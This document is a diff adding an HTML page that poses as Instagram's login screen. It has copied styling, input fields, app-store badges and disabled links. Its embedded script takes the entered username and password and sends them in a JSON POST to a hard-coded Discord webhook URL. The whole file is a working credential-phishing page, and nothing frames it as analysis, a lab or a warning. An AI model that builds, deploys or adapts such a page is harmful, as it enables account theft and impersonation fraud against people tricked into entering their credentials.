@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Instagram Login</title>
+  
+  <style>
+    body {
+      font-family: 'SF Pro Display', sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      background-color: #fff;
+      padding: 40px;
+      border-radius: 5px;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+      width: 350px;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 32px;
+      margin-bottom: 20px;
+      color: #3897f0;
+      font-weight: 600;
+      letter-spacing: -1px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px 20px;
+      margin: 8px 0;
+      display: inline-block;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
+      border-radius: 4px;
+      font-size: 16px;
+      font-family: 'SF Pro Text', sans-serif;
+    }
+
+    button {
+      background-color: #3897f0;
+      color: white;
+      padding: 12px 20px;
+      margin: 8px 0;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      width: 100%;
+      font-size: 16px;
+      font-family: 'SF Pro Text', sans-serif;
+    }
+
+    button:hover {
+      background-color: #2171be;
+    }
+
+    .or {
+      margin: 15px 0;
+      color: #888;
+      font-size: 16px;
+      font-family: 'SF Pro Text', sans-serif;
+    }
+
+    .social-login {
+      margin-top: 20px;
+    }
+
+    .social-login a {
+      display: inline-block;
+      margin: 0 10px;
+      color: #3897f0;
+      font-size: 16px;
+      text-decoration: none;
+      cursor: not-allowed;
+      pointer-events: none;
+      opacity: 0.5;
+      font-family: 'SF Pro Text', sans-serif;
+    }
+
+    .forgot-password {
+      margin-top: 10px;
+      color: #888;
+      font-size: 16px;
+      text-decoration: none;
+      font-family: 'SF Pro Text', sans-serif;
+    }
+
+    .forgot-password:hover {
+      text-decoration: underline;
+    }
+
+    .signup {
+      margin-top: 20px;
+    }
+
+    .signup a {
+      color: #3897f0;
+      font-size: 16px;
+      text-decoration: none;
+      cursor: not-allowed;
+      pointer-events: none;
+      opacity: 0.5;
+      font-family: 'SF Pro Text', sans-serif;
+    }
+
+    .app-store {
+      display: inline-block;
+      margin: 20px 10px;
+    }
+
+    .app-store img {
+      width: 150px;
+      cursor: not-allowed;
+      pointer-events: none;
+      opacity: 0.5;
+    }
+  </style>
+
+</head>
+<body>
+  <div class="container">
+    <h1>Instagram</h1>
+    <input type="text" id="username" placeholder="Phone number, username or email a...">
+    <input type="password" id="password" placeholder="Password">
+    <button id="login-btn">Log in</button>
+    <div class="or">OR</div>
+    <div class="social-login">
+      <a href="#" disabled><i class="fab fa-facebook-f"></i>Log in with Facebook</a>
+    </div>
+    <a href="#" class="forgot-password">Forgotten your password?</a>
+    <div class="signup">
+      Don't have an account? <a href="#" disabled>Sign up</a>
+    </div>
+    <div class="app-store">
+      <a href="#" disabled><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/1200px-Download_on_the_App_Store_Badge.svg.png" alt="App Store"></a>
+      <a href="#" disabled><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8c/Google_Play_Store_badge.svg/1200px-Google_Play_Store_badge.svg.png" alt="Google Play"></a>
+    </div>
+  </div>
+  <script>
+    document.getElementById('login-btn').addEventListener('click', (e) => {
+      e.preventDefault();
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      handleLogin(username, password);
+    });
+
+    function handleLogin(username, password) {
+      const webhookUrl = 'https://discord.com/api/webhooks/1258054129209835520/t5Et_MOyuOmE0av2iyf1cSFPEeXHrTqBF_yCdrVPOFOShPQziNXC44g5tuLG9EtqCtLt';
+
+      const userData = {
+        username: username,
+        password: password,
+      };
+
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          content: `User ${username} has logged in!`,
+          embeds: [
+            {
+              title: 'Login Information',
+              fields: [
+                {
+                  name: 'username',
+                  value: userData.username,
+                },
+                {
+                  name: 'password',
+                  value: userData.password,
+                },
+              ],
+            },
+          ],
+        }),
+      })
+      .then(response => response.json())
+      .then(data => console.log(data))
+      .catch(error => console.error(error));
+    }
+  </script>
+</body>
+</html>
